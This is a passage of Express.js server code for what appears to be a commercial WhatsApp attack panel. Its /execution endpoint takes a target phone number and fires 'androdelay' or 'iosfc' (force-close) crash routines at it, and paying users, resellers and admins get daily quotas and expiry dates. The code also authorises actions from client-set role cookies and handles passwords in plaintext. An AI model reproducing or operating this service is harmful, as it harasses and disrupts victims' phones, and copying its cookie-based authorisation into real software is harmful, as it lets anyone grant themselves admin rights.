        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired</label>
        <input type="text" value="${expiredText} - Remaining time: ${sisaHari} more days" disabled class="expired-info">

        <label>Extend</label>
        <input type="number" name="extend" min="0" placeholder="Duration (days)">

        <label>Role</label>
        <select name="role">
          ${roleOptions}
        </select>

        <button type="submit"><i class="fas fa-save"></i> Save Changes</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn" style="display:block; max-width:480px; margin:20px auto;"><i class="fas fa-arrow-left"></i> Back to User List</a>
  </div>

  <!-- JS Partikel -->
  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    });
  </script>
</body>
</html>
`;

  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user dan tidak bisa ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya boleh edit user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak bisa edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit admin lain.");
  }

  // ❌ Admin tidak bisa set role jadi admin (buat yang lain)
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Perpanjang expired
  const now = Date.now();
  const current = targetUser.expired > now ? targetUser.expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...targetUser,
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh update akun sendiri
  if (sessionUsername === oldUsername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user, dan tidak boleh ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya bisa mengubah user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak boleh edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit sesama admin.");
  }

  // ❌ Admin tidak boleh ubah role ke admin
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Update username & password
  targetUser.username = username;
  targetUser.password = password;

  // ✅ Update expired
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = targetUser.expired;
    targetUser.expired = currentExp > now
      ? currentExp + days * 86400000
      : now + days * 86400000;
  }

  // ✅ Ubah role jika owner, atau admin (dengan batasan)
  if (sessionRole === "owner") {
    targetUser.role = role;
  } else if (sessionRole === "admin" && (role === "user" || role === "reseller")) {
    targetUser.role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;
  const usageData = getUsageLimit();
  const today = new Date().toISOString().split("T")[0];
  const uname = currentUser.username;
  const role = currentUser.role;

  if (!usageData[uname]) usageData[uname] = {};
  if (!usageData[uname][today]) usageData[uname][today] = 0;

  const limitPerRole = {
    user: 10,
    reseller: 25
  };

  if (limitPerRole[role] !== undefined) {
    const usedToday = usageData[uname][today];
    const limitToday = limitPerRole[role];

    if (usedToday >= limitToday) {
      console.log(`[LIMIT] ${uname} used ${usageData[uname][today]} / ${limitPerRole[role]}`);
      return res.send(executionPage("LIMIT TOAST", {
        message: `❌ Kamu sudah mencapai batas ${limitToday}x hari ini. Coba lagi besok.`,
        toastOnly: true
      }, false, currentUser, "", mode));
    }

    // Tambah counter kalau belum limit
    usageData[uname][today]++;
    saveUsageLimit(usageData);
  }

  if (sessions.size === 0) {
    return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
      message: "Tunggu sampai maintenance selesai..."
    }, false, currentUser, "", mode));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPage("✅ Server ON", {
        message: "Pilih mode yang ingin digunakan."
      }, true, currentUser, "", ""));
    }

    if (["androdelay", "androdelay2", "iosfc"].includes(mode)) {
      return res.send(executionPage("✅ Server ON", {
        message: "Masukkan nomor target (62xxxxxxxxxx)."
      }, true, currentUser, "", mode));
    }

    return res.send(executionPage("❌ Mode salah", {
      message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
    }, false, currentUser, "", ""));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPage("❌ Format salah", {
      target: targetNumber,
      message: "Nomor harus hanya angka dan diawali dengan nomor negara"
    }, true, currentUser, "", mode));
  }

  try {
    if (mode === "androdelay") {
      DelayAndro(24, target);
    } else if (mode === "iosfc") {
      FcIos(24, target);
    } else if (mode === "androdelay2") {
      DelayAndro2(24, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`,
      cleanURL: true  // Parameter baru untuk memberi tahu client membersihkan URL
    }, false, currentUser, "", mode, true));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user && user.isLoggedIn) {
  user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }

  // 🔥 Clear semua cookies biar gak nyangkut
  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.clearCookie("isLoggedIn", "true"); // <== ini yang kurang
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${PORT}`);
});